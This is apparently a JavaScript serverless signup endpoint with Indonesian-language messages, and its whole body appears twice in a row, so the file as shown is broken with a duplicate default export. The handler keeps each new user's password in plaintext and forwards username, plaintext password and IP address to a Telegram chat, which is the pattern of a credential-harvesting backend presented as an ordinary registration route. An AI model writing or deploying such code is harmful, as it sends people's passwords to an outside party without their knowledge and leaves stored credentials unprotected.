import { users, escapeHtml } from "./_users.js";
import { sendTelegram } from "./_telegram.js";

export default async function handler(req, res) {
    // CORS
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(204).end();
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, message: "Method not allowed" });
    }

    try {
        const { username, password } = req.body || {};

        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Username dan password wajib diisi" });
        }

        const uname = String(username).trim();
        const pass  = String(password);

        if (uname.length < 3) return res.status(400).json({ success: false, message: "Username minimal 3 karakter" });
        if (pass.length < 5)  return res.status(400).json({ success: false, message: "Password minimal 5 karakter" });
        if (users.has(uname)) return res.status(409).json({ success: false, message: "Username sudah terdaftar" });

        users.set(uname, { password: pass, createdAt: new Date().toISOString() });

        const ip = req.headers["x-forwarded-for"] || "-";
        const time = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

        // Kirim ke Telegram (fire and forget)
        sendTelegram(
            `<b>REGISTRASI BARU</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>Username:</b> <code>${escapeHtml(uname)}</code>\n` +
            `<b>Password:</b> <code>${escapeHtml(pass)}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>IP:</b> <code>${escapeHtml(String(ip))}</code>\n` +
            `<b>Waktu:</b> ${time}\n` +
            `<b>Total user:</b> ${users.size}`
        );

        return res.json({ success: true, message: "Registrasi berhasil, silakan login" });

    } catch (err) {
        console.error("Register error:", err);
        return res.status(500).json({ success: false, message: "Terjadi kesalahan server" });
    }
}import { users, escapeHtml } from "./_users.js";
import { sendTelegram } from "./_telegram.js";

export default async function handler(req, res) {
    // CORS
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type");

    if (req.method === "OPTIONS") return res.status(204).end();
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, message: "Method not allowed" });
    }

    try {
        const { username, password } = req.body || {};

        if (!username || !password) {
            return res.status(400).json({ success: false, message: "Username dan password wajib diisi" });
        }

        const uname = String(username).trim();
        const pass  = String(password);

        if (uname.length < 3) return res.status(400).json({ success: false, message: "Username minimal 3 karakter" });
        if (pass.length < 5)  return res.status(400).json({ success: false, message: "Password minimal 5 karakter" });
        if (users.has(uname)) return res.status(409).json({ success: false, message: "Username sudah terdaftar" });

        users.set(uname, { password: pass, createdAt: new Date().toISOString() });

        const ip = req.headers["x-forwarded-for"] || "-";
        const time = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

        // Kirim ke Telegram (fire and forget)
        sendTelegram(
            `<b>REGISTRASI BARU</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>Username:</b> <code>${escapeHtml(uname)}</code>\n` +
            `<b>Password:</b> <code>${escapeHtml(pass)}</code>\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `<b>IP:</b> <code>${escapeHtml(String(ip))}</code>\n` +
            `<b>Waktu:</b> ${time}\n` +
            `<b>Total user:</b> ${users.size}`
        );

        return res.json({ success: true, message: "Registrasi berhasil, silakan login" });

    } catch (err) {
        console.error("Register error:", err);
        return res.status(500).json({ success: false, message: "Terjadi kesalahan server" });
    }
}